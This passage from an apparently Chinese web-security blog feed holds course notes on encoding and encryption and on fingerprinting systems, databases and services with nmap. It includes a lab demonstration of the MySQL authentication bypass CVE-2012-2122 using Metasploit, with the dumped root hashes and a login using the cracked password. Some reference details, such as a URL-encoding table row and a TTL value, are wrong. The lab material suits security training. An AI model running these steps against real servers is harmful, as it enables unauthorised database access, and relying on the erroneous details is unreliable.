        <content type="html"><![CDATA[<h2 id="基础入门-加密编码算法"><a href="#基础入门-加密编码算法" class="headerlink" title="基础入门-加密编码算法"></a><font size="6"><strong>基础入门-加密编码算法</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="一、前言知识"></a><font size="5"><strong>一、前言知识</strong></font></h3><p>前言:在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展。</p><h4 id="1、加密解密"><a href="#1、加密解密" class="headerlink" title="1、加密解密"></a><font size="4"><strong>1、加密解密</strong></font></h4><p>加密软件<br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/1.png"><br>解密软件<br><a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/2.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#常见加密编码等算法解析</span>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等<span class="token comment" spellcheck="true">#常见加密形式算法解析</span>直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等<span class="token comment" spellcheck="true">#常见解密方式（针对)</span>枚举，自定义逆向算法，可逆向<span class="token comment" spellcheck="true">#了解常规加密算法的特性</span>长度位数，字符规律，代码分析，搜索获取等</code></pre><h4 id="2、时间戳"><a href="#2、时间戳" class="headerlink" title="2、时间戳"></a><font size="4"><strong>2、时间戳</strong></font></h4><p>在线转换工具：<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a><br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/3.png"><br>时间戳通常是用在用户的注册、登录、注销等情况</p><h4 id="3、URL编码"><a href="#3、URL编码" class="headerlink" title="3、URL编码"></a><font size="4"><strong>3、URL编码</strong></font></h4><p><a href="https://www.cnblogs.com/cxygg/p/9278542.html">https://www.cnblogs.com/cxygg/p/9278542.html</a></p><table>    <thead>        <tr>            <th>序号</th>            <th>特殊字符</th>            <th>含义</th>            <th>十六进制值</th>        </tr>    </thead>    <tbody>        <tr>            <td>1</td>            <td>+</td>            <td>URL 中+号表示空格</td>            <td>%2B</td>        </tr>        <tr>            <td>2</td>            <td>空格</td>            <td>URL中的空格可以用+号或者编码</td>            <td>%20</td>        </tr>        <tr>            <td>3</td>            <td>/</td>            <td>分隔目录和子目录</td>            <td>%2F</td>        </tr>        <tr>            <td>4</td>            <td>?</td>            <td>分隔实际的 URL 和参数</td>            <td>%3F</td>        </tr>        <tr>            <td>5</td>            <td>%</td>            <td>指定特殊字符</td>            <td>%25</td>        </tr>        <tr>            <td>6</td>            <td>#</td>            <td>表示书签</td>            <td>%23</td>        </tr>        <tr>            <td>7</td>            <td>&</td>            <td>URL 中指定的参数间的分隔符</td>            <td>%26</td>        </tr>        <tr>            <td>8</td>            <td>=</td>            <td>URL 中+号表示空格</td>            <td>%3D</td>        </tr>    </tbody></table><h4 id="4、base64编码"><a href="#4、base64编码" class="headerlink" title="4、base64编码"></a><font size="4"><strong>4、base64编码</strong></font></h4><p><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/4.png"><br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/5.png"><br>base64编码的特点：随着编码的文本增加而增加、由大小写和数字组成且字符结尾一般有两个等号<br>一般在代码中为了安全会使用base64进行编码</p><h4 id="5、unescape编码"><a href="#5、unescape编码" class="headerlink" title="5、unescape编码"></a><font size="4"><strong>5、unescape编码</strong></font></h4><p><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/6.png"><br>和URL编码有点像<br>特点：一般是%U+四个数字对应着两个字符、主要运用于网站web应用</p><h4 id="4、AES加密"><a href="#4、AES加密" class="headerlink" title="4、AES加密"></a><font size="4"><strong>4、AES加密</strong></font></h4><p>aes在逐渐的取代md5值、在解密的过程中一定要知道密码和偏移量不然是借不出来的。<br>在线工具：<a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a><br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/7.png"><br><img src="/2023/09/19/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-006/8.png"></p><h3 id="二、演示案例："><a href="#二、演示案例：" class="headerlink" title="二、演示案例："></a><font size="5"><strong>二、演示案例：</strong></font></h3><h4 id="✧-某CTF比赛题目解析"><a href="#✧-某CTF比赛题目解析" class="headerlink" title="✧ 某CTF比赛题目解析"></a><font size="4"><strong>✧ 某CTF比赛题目解析</strong></font></h4><p>脚本自定义算法组合逆向</p><h4 id="✧-某CMS密码加密解密"><a href="#✧-某CMS密码加密解密" class="headerlink" title="✧ 某CMS密码加密解密"></a><font size="4"><strong>✧ 某CMS密码加密解密</strong></font></h4><p>MD5+salt<br>部分CMS密码加密形式-wp,dz等</p><h4 id="✧-某URL加密地址的漏洞测试"><a href="#✧-某URL加密地址的漏洞测试" class="headerlink" title="✧ 某URL加密地址的漏洞测试"></a><font size="4"><strong>✧ 某URL加密地址的漏洞测试</strong></font></h4><p>AES+Base64+自定义<br>观察参数值加密字符串，下载源代码分析，函数定义AES加密，涉及模式CBC,128位，加密密码，偏移量，两次base64减去常规一次，填充模式。（_mozhe）</p><p>ZUlJOGMzSmVMMHQwZHhNN3diM056Zz09<br>eII8c3JeL0t0dxM7wb3Nzg&#x3D;&#x3D;</p><h4 id="✧-某实际应用URL地址参数加密"><a href="#✧-某实际应用URL地址参数加密" class="headerlink" title="✧ 某实际应用URL地址参数加密"></a><font size="4"><strong>✧ 某实际应用URL地址参数加密</strong></font></h4><p>#搜素特定关键字加密字符串</p><h3 id="三、涉及资源："><a href="#三、涉及资源：" class="headerlink" title="三、涉及资源："></a><font size="5"><strong>三、涉及资源：</strong></font></h3><p><a href="https://www.mozhe.cn/">https://www.mozhe.cn</a><br><a href="https://www.cmd5.com/">https://www.cmd5.com</a><br><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a><br><a href="https://ctf.bugku.com/challenges">https://ctf.bugku.com/challenges</a><br><a href="https://www.cr173.com/soft/21692.html">https://www.cr173.com/soft/21692.html</a><br><a href="https://gitee.com/ComsenzDiscuz/DiscuzX">https://gitee.com/ComsenzDiscuz/DiscuzX</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-005</title>
      <link href="/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/"/>
      <url>/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/</url>
      
        <content type="html"><![CDATA[<h2 id="基础入门-系统及数据库"><a href="#基础入门-系统及数据库" class="headerlink" title="基础入门-系统及数据库"></a><font size="6"><strong>基础入门-系统及数据库</strong></font></h2><span id="more"></span><p><img src="/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/1.png"></p><h3 id="一、操作系统层面："><a href="#一、操作系统层面：" class="headerlink" title="一、操作系统层面："></a><font size="5"><strong>一、操作系统层面：</strong></font></h3><h4 id="1、识别操作系统常见方法"><a href="#1、识别操作系统常见方法" class="headerlink" title="1、识别操作系统常见方法"></a><font size="4"><strong>1、识别操作系统常见方法</strong></font></h4><p>a、有网站<br>可以通过网站识别通过网站的手工识别方法判断：<br>windows对大小写不敏感也就是说你在网页中可以替换网站路径的大小写进行测试</p><p>b、没有网站<br>通过nmap进行扫描方法：<br>nmap -O IP地址</p><pre class=" language-bash"><code class="language-bash">──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># nmap -O 10.1.1.10 </span>Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-07 21:06 CSTNmap scan report <span class="token keyword">for</span> 10.1.1.10 <span class="token punctuation">(</span>10.1.1.10<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.0011s latency<span class="token punctuation">)</span>.Not shown: 999 closed portsPORT   STATE SERVICE22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>MAC Address: 00:0C:29:13:E9:61 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux 3.X<span class="token operator">|</span>4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop</code></pre><p>备注：不是所有的系统都可以用这种方式扫描出操作系统的类型、在windows的一些高版本中无法探测，例如：</p><pre class=" language-bash"><code class="language-bash">─<span class="token comment" spellcheck="true"># nmap -O 10.1.1.129</span>Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-07 21:10 CSTNmap scan report <span class="token keyword">for</span> 10.1.1.129 <span class="token punctuation">(</span>10.1.1.129<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.00053s latency<span class="token punctuation">)</span>.Not shown: 994 closed portsPORT     STATE SERVICE80/tcp   <span class="token function">open</span>  httpMAC Address: 00:0C:29:DC:AF:EA <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>No exact OS matches <span class="token keyword">for</span> host <span class="token punctuation">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="token punctuation">)</span>.TCP/IP fingerprint:OS:SCAN<span class="token punctuation">(</span>V<span class="token operator">=</span>7.91%E<span class="token operator">=</span>4%D<span class="token operator">=</span>6/7%OT<span class="token operator">=</span>80%CT<span class="token operator">=</span>1%CU<span class="token operator">=</span>36041%PV<span class="token operator">=</span>Y%DS<span class="token operator">=</span>1%DC<span class="token operator">=</span>D%G<span class="token operator">=</span>Y%M<span class="token operator">=</span>000C29%TMOS:<span class="token operator">=</span>60BE1ADE%P<span class="token operator">=</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span>106%GCD<span class="token operator">=</span>1%ISR<span class="token operator">=</span>10C%TI<span class="token operator">=</span>I%CI<span class="token operator">=</span>I%II<span class="token operator">=</span>I%OS:SS<span class="token operator">=</span>S%TS<span class="token operator">=</span>U<span class="token punctuation">)</span>OPS<span class="token punctuation">(</span>O1<span class="token operator">=</span>M5B4NW8NNS%O2<span class="token operator">=</span>M5B4NW8NNS%O3<span class="token operator">=</span>M5B4NW8%O4<span class="token operator">=</span>M5B4NW8NNS%O5<span class="token operator">=</span>M5OS:B4NW8NNS%O6<span class="token operator">=</span>M5B4NNS<span class="token punctuation">)</span>WIN<span class="token punctuation">(</span>W1<span class="token operator">=</span>FFFF%W2<span class="token operator">=</span>FFFF%W3<span class="token operator">=</span>FFFF%W4<span class="token operator">=</span>FFFF%W5<span class="token operator">=</span>FFFF%W6<span class="token operator">=</span>FF70<span class="token punctuation">)</span>OS:ECN<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>FFFF%O<span class="token operator">=</span>M5B4NW8NNS%CC<span class="token operator">=</span>Y%Q<span class="token operator">=</span><span class="token punctuation">)</span>T1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%S<span class="token operator">=</span>O%A<span class="token operator">=</span>S+%OS:F<span class="token operator">=</span>AS%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T2<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T3<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>OS:80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>O%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T4<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>A%A<span class="token operator">=</span>O%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%OS:Q<span class="token operator">=</span><span class="token punctuation">)</span>T5<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T6<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>OS:A%A<span class="token operator">=</span>O%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T7<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>80%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>U1<span class="token punctuation">(</span>R<span class="token operator">=</span>OS:Y%DF<span class="token operator">=</span>N%T<span class="token operator">=</span>80%IPL<span class="token operator">=</span>164%UN<span class="token operator">=</span>0%RIPL<span class="token operator">=</span>G%RID<span class="token operator">=</span>G%RIPCK<span class="token operator">=</span>G%RUCK<span class="token operator">=</span>G%RUD<span class="token operator">=</span>G<span class="token punctuation">)</span>IE<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DFI<span class="token operator">=</span>N%OS:T<span class="token operator">=</span>80%CD<span class="token operator">=</span>Z<span class="token punctuation">)</span></code></pre><p>c、TTL</p><pre class=" language-不同的操作系统的默认TTL值是不同的，"><code class="language-不同的操作系统的默认TTL值是不同的，">1、WINDOWS NT/2000   TTL：1282、WINDOWS 95/98     TTL：323、UNIX              TTL：2554、LINUX             TTL：645、WIN7           TTL：64</code></pre><p>d、特殊端口 如（22 &#x2F; 139 &#x2F; 445 &#x2F; 1433 &#x2F; 3389）</p><h4 id="2、简要两者区别及识别意义"><a href="#2、简要两者区别及识别意义" class="headerlink" title="2、简要两者区别及识别意义"></a><font size="4"><strong>2、简要两者区别及识别意义</strong></font></h4><pre class=" language-bash"><code class="language-bash">区别出不同的操作系统才能对症下药、因为windows和linux的漏洞是不一样的、可能windows的漏洞在windows上就不能运用，</code></pre><h4 id="3、操作系统层面漏洞类型对应意义"><a href="#3、操作系统层面漏洞类型对应意义" class="headerlink" title="3、操作系统层面漏洞类型对应意义"></a><font size="4"><strong>3、操作系统层面漏洞类型对应意义</strong></font></h4><pre class=" language-bash"><code class="language-bash">不同的漏洞会造成不同漏洞利用的条件</code></pre><h4 id="4、简要操作系统层面漏洞影响范围"><a href="#4、简要操作系统层面漏洞影响范围" class="headerlink" title="4、简要操作系统层面漏洞影响范围"></a><font size="4"><strong>4、简要操作系统层面漏洞影响范围</strong></font></h4><pre class=" language-bash"><code class="language-bash">有些漏洞会对操作系统造成崩溃、而有些系统只是蓝屏、或者是权限的提升</code></pre><h3 id="二、数据库层面"><a href="#二、数据库层面" class="headerlink" title="二、数据库层面"></a><font size="5"><strong>二、数据库层面</strong></font></h3><h4 id="1、识别数据库类型常见方法"><a href="#1、识别数据库类型常见方法" class="headerlink" title="1、识别数据库类型常见方法"></a><font size="4"><strong>1、识别数据库类型常见方法</strong></font></h4><p>默认的语言搭配的数据库</p><pre class=" language-bash"><code class="language-bash">组合类型asp + access/mssql组合类型php + mysql 组合类型aspx+mssql组合类型jsp +mysql/oracle组合类型Python + MongoDB</code></pre><p>常见的数据库默认端口号</p><pre class=" language-bash"><code class="language-bash">关系型数据库  mysql3306  sqlserver1433  oracle1521  psotgresql5432非关系型数据库  MongoDB27017  Redis6379  memcached11211其他：  1527　　      Derby  5432　　      pgsql  5000　　      db2  9092　　      pointbase  无默认　      Informix</code></pre><h4 id="2、数据库类型区别及识别意义"><a href="#2、数据库类型区别及识别意义" class="headerlink" title="2、数据库类型区别及识别意义"></a><font size="4"><strong>2、数据库类型区别及识别意义</strong></font></h4><pre class=" language-bash"><code class="language-bash">数据库的不同表示的结构也是不同、写法结构也不一样、所以产生的漏洞也不一样。不同的数据库的攻击方式也不完全一样。</code></pre><h4 id="3、数据库常见漏洞类型及攻击"><a href="#3、数据库常见漏洞类型及攻击" class="headerlink" title="3、数据库常见漏洞类型及攻击"></a><font size="4"><strong>3、数据库常见漏洞类型及攻击</strong></font></h4><pre class=" language-bash"><code class="language-bash">存在弱口令数据库漏洞</code></pre><h4 id="4、简要数据库层面漏洞影响范围"><a href="#4、简要数据库层面漏洞影响范围" class="headerlink" title="4、简要数据库层面漏洞影响范围"></a><font size="4"><strong>4、简要数据库层面漏洞影响范围</strong></font></h4><pre class=" language-bash"><code class="language-bash">数据库权限网站权限修改网页内容</code></pre><h3 id="三、第三方层面"><a href="#三、第三方层面" class="headerlink" title="三、第三方层面"></a><font size="5"><strong>三、第三方层面</strong></font></h3><h4 id="1、如何判断有那些第三方平台或软件"><a href="#1、如何判断有那些第三方平台或软件" class="headerlink" title="1、如何判断有那些第三方平台或软件"></a><font size="4"><strong>1、如何判断有那些第三方平台或软件</strong></font></h4><pre class=" language-bash"><code class="language-bash">通过网站去扫描有些网站安装了第三方的软件如phpmyadmin通过扫描就可以发现他的安装目录判断安装了第三方软件端口扫描nmap -O -sV 10.1.1.130Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-08 09:26 CSTNmap scan report <span class="token keyword">for</span> 10.1.1.130 <span class="token punctuation">(</span>10.1.1.130<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.00085s latency<span class="token punctuation">)</span>.Not shown: 978 closed portsPORT     STATE SERVICE     VERSION21/tcp   <span class="token function">open</span>  <span class="token function">ftp</span>         vsftpd 2.3.422/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>         OpenSSH 4.7p1 Debian 8ubuntu1 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>23/tcp   <span class="token function">open</span>  telnet      Linux telnetd25/tcp   <span class="token function">open</span>  smtp        Postfix smtpd80/tcp   <span class="token function">open</span>  http        Apache httpd 2.2.8 <span class="token punctuation">((</span>Ubuntu<span class="token punctuation">)</span> DAV/2<span class="token punctuation">)</span>111/tcp  <span class="token function">open</span>  rpcbind     2 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100000)</span>139/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd 3.X - 4.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>445/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd 3.X - 4.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>512/tcp  <span class="token function">open</span>  exec?513/tcp  <span class="token function">open</span>  login?514/tcp  <span class="token function">open</span>  tcpwrapped1099/tcp <span class="token function">open</span>  java-rmi    GNU Classpath grmiregistry1524/tcp <span class="token function">open</span>  bindshell   Metasploitable root shell2049/tcp <span class="token function">open</span>  nfs         2-4 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100003)</span>2121/tcp <span class="token function">open</span>  <span class="token function">ftp</span>         ProFTPD 1.3.13306/tcp <span class="token function">open</span>  mysql       MySQL 5.0.51a-3ubuntu55432/tcp <span class="token function">open</span>  postgresql  PostgreSQL DB 8.3.0 - 8.3.75900/tcp <span class="token function">open</span>  vnc         VNC <span class="token punctuation">(</span>protocol 3.3<span class="token punctuation">)</span>6000/tcp <span class="token function">open</span>  X11         <span class="token punctuation">(</span>access denied<span class="token punctuation">)</span>6667/tcp <span class="token function">open</span>  irc         UnrealIRCd8009/tcp <span class="token function">open</span>  ajp13       Apache Jserv <span class="token punctuation">(</span>Protocol v1.3<span class="token punctuation">)</span>8180/tcp <span class="token function">open</span>  http        Apache Tomcat/Coyote JSP engine 1.1</code></pre><h4 id="2、简要为什么要识别第三方平台或软件"><a href="#2、简要为什么要识别第三方平台或软件" class="headerlink" title="2、简要为什么要识别第三方平台或软件"></a><font size="4"><strong>2、简要为什么要识别第三方平台或软件</strong></font></h4><pre class=" language-bash"><code class="language-bash">不同的第三方软件或工具存在不同的漏洞、识别到更多的信息对收集到的漏洞也就越多</code></pre><h4 id="3、常见第三方平台或软件漏洞类型及攻击"><a href="#3、常见第三方平台或软件漏洞类型及攻击" class="headerlink" title="3、常见第三方平台或软件漏洞类型及攻击"></a><font size="4"><strong>3、常见第三方平台或软件漏洞类型及攻击</strong></font></h4><pre class=" language-bash"><code class="language-bash">弱口令软件的漏洞攻击</code></pre><h4 id="4、简要第三方平台或软件安全测试的范围"><a href="#4、简要第三方平台或软件安全测试的范围" class="headerlink" title="4、简要第三方平台或软件安全测试的范围"></a><font size="4"><strong>4、简要第三方平台或软件安全测试的范围</strong></font></h4><pre class=" language-bash"><code class="language-bash">直接获取到软件的权限便于进一步的提权和攻击</code></pre><p>补充<br>除去常规wEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了wEB应用或其他安全问题。所以明确安全测试思路是很重要的!</p><h3 id="四、演示案例"><a href="#四、演示案例" class="headerlink" title="四、演示案例"></a><font size="5"><strong>四、演示案例</strong></font></h3><h4 id="1、上述涉及的基础知识"><a href="#1、上述涉及的基础知识" class="headerlink" title="1、上述涉及的基础知识"></a><font size="4"><strong>1、上述涉及的基础知识</strong></font></h4><h4 id="2、演示某操作系统层面漏洞"><a href="#2、演示某操作系统层面漏洞" class="headerlink" title="2、演示某操作系统层面漏洞"></a><font size="4"><strong>2、演示某操作系统层面漏洞</strong></font></h4><h4 id="3、演示某数据库弱口令及漏洞演示"><a href="#3、演示某数据库弱口令及漏洞演示" class="headerlink" title="3、演示某数据库弱口令及漏洞演示"></a><font size="4"><strong>3、演示某数据库弱口令及漏洞演示</strong></font></h4><p><font size="3"><strong>方法1</strong></font></p><p>漏洞探测</p><pre class=" language-bash"><code class="language-bash">参考文档：https://vulhub.org/<span class="token comment" spellcheck="true">#/environments/mysql/CVE-2012-2122/</span>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># nmap -O -sV 10.1.1.133</span>Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-08 11:09 CSTNmap scan report <span class="token keyword">for</span> 10.1.1.133 <span class="token punctuation">(</span>10.1.1.133<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.0011s latency<span class="token punctuation">)</span>.Not shown: 998 closed portsPORT     STATE SERVICE VERSION22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 7.4 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>3306/tcp <span class="token function">open</span>  mysql   MySQL 5.5.23MAC Address: 00:0C:29:13:E9:61 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Device type: general purposeRunning: Linux 3.X<span class="token operator">|</span>4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 1.88 seconds</code></pre><p>漏洞利用</p><pre class=" language-bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary/scanner/mysql/mysql_authbypass_hashdumpmsf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_authbypass_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> rhosts 10.1.1.133rhosts <span class="token operator">=</span><span class="token operator">></span> 10.1.1.133msf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_authbypass_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> threads 10threads <span class="token operator">=</span><span class="token operator">></span> 10msf6 auxiliary<span class="token punctuation">(</span>scanner/mysql/mysql_authbypass_hashdump<span class="token punctuation">)</span> <span class="token operator">></span> run<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 The server allows logins, proceeding with bypass <span class="token function">test</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 10% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 20% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 30% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 40% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 50% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 60% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 70% complete<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Authentication bypass is 80% complete<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Successfully bypassed authentication after 847 attempts. URI: mysql://root:DBrmCST@10.1.1.133:3306<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Successfully exploited the authentication bypass flaw, dumping hashes<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.1.1.133:3306       - 10.1.1.133:3306 Hash Table has been saved: /root/.msf4/loot/20210608111341_default_10.1.1.133_mysql.hashes_091970.txt<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 10.1.1.133:3306       - Scanned 1 of 1 hosts <span class="token punctuation">(</span>100% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completedmd5在线解密https://www.cmd5.com/</code></pre><p><img src="/2023/09/18/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-005/2.png"></p><pre class=" language-bash"><code class="language-bash">└─<span class="token comment" spellcheck="true"># mysql -uroot -p123456 -h10.1.1.133</span>Welcome to the MariaDB monitor.  Commands end with <span class="token punctuation">;</span> or \g.Your MySQL connection <span class="token function">id</span> is 886Server version: 5.5.23 Source distributionCopyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show databases<span class="token punctuation">;</span>+--------------------+<span class="token operator">|</span> Database           <span class="token operator">|</span>+--------------------+<span class="token operator">|</span> information_schema <span class="token operator">|</span><span class="token operator">|</span> mysql              <span class="token operator">|</span><span class="token operator">|</span> performance_schema <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">test</span>               <span class="token operator">|</span>+--------------------+4 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.001 sec<span 